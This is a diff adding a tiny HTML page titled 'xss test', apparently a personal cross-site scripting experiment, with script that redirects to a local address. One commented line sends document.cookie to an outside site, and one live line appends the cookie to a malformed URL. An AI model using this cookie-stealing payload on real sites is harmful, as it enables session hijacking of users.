@@ -1,0 +1,15 @@
+<html>
+  <head>
+    <title>xss test</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <script>
+      document.location.replace('http://192.168.1.11/~descent/xss_p2.html');
+      // document.location.replace('http://rickspage.com/?secret='+document.cookie);
+      // ref: http://janet1.pixnet.net/blog/post/29054414-xss(cross-site-scripting)%E6%94%BB%E6%93%8A%E6%9C%83%E8%AE%93%E6%82%A8%E9%81%BA%E5%A4%B1cookie%E4%B8%AD%E7%9A%84
+      document.location.replace('http://http://192.168.1.11/~descent/xss_p2.html='+document.cookie);
+    </script>
+  </head>
+  <body>
+  to here.<br>
+  </body>
+</html>
